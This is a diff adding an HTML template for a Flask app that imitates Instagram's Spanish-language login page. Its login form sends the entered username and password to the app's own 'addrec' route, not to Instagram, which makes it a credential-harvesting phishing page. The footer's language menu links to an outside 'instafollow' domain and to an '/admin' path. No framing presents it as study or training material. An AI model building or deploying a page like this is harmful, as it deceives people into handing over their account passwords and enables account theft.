@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css' ) }}">
+    <title>Instagram</title>
+</head>
+<body>
+    <span id="root">
+      <section class="section-all">
+  
+        <!-- 1-Role Main -->
+        <main class="main" role="main">
+          <div class="wrapper">
+            <article class="article">
+              <div class="content">
+                <div class="login-box">
+                  <div class="header">
+                    <img class="logo" src="../static/images/Instagram_logo.svg.png" alt="Instagram">
+                  </div><!-- Header end -->
+                  <div class="form-wrap">
+                    <form class="form" action = "{{ url_for('addrec') }}" method = "POST">
+  
+                      <div class="input-box" data-validate = "Username is required">
+                        <input type="text" aria-describedby="" placeholder="Número de telefono, Usuario, o Email" aria-required="true" maxlength="30" autocapitalize="off" name= "nm" >
+                      </div>  
+  
+                      <div class="input-box" data-validate = "Password is required">
+                        <input type="password" name= "add" placeholder="Contraseña" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off">
+                      </div>
+                      <span class="button-box">
+                        <button class="btn" type="submit" name="submit" onclick="window.location.href='#'">Iniciar seción</button>
+                      </span>  
+  
+                      <a class="forgot" href="">¿Olvidaste la Contraseña?</a>
+                    </form>
+                  </div> <!-- Form-wrap end -->
+                </div> <!-- Login-box end -->
+  
+                <div class="login-box">
+                  <p class="text">¿No tienes una cuenta?<a href="#">Regístrate</a></p>
+                </div> <!-- Signup-box end -->
+  
+                <div class="app">
+                  <p>Obtén la App.</p>
+                  <div class="app-img">
+                    <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                      <img src="../static/images/appstore.png" >
+                    </a>
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                      <img src="../static/images/playstore.png">
+                    </a>  
+                  </div>  <!-- App-img end-->
+                </div> <!-- App end -->
+              </div> <!-- Content end -->
+            </article>
+          </div> <!-- Wrapper end -->
+        </main>
+  
+        <!-- 2-Role Footer -->
+        <footer class="footer" role="contentinfo">
+          <div class="footer-container">
+  
+            <nav class="footer-nav" role="navigation">
+              <ul>
+                <li><a href="">About Us</a></li>
+                <li><a href="">Support</a></li>
+                <li><a href="">Blog</a></li>
+                <li><a href="">Press</a></li>
+                <li><a href="">Api</a></li>
+                <li><a href="">Jobs</a></li>
+                <li><a href="">Privacy</a></li>
+                <li><a href="">Terms</a></li>
+                <li><a href="">Directory</a></li>
+                <li>
+                  <span class="language">Language
+                    <select name="language" class="select" onchange="la(this.value)">
+                      <option value="#">Español</option>
+                      <option value="http://ru-instafollow.bitballoon.com">English</option>
+                      <option value="/admin">&copy;Brayan</option>
+                    </select>
+                  </span>
+                </li>
+              </ul>
+            </nav>
+  
+            <span class="footer-logo">&copy; 2022 Instagram <br> @Brayan</span>
+          </div> <!-- Footer container end -->
+        </footer>
+        
+      </section>
+    </span> <!-- Root -->
+  
+    <!-- Select Link -->
+    <script type="text/javascript">
+      function la(src) {
+        window.location=src;
+      }
+    </script>
+  </body>
+</html>
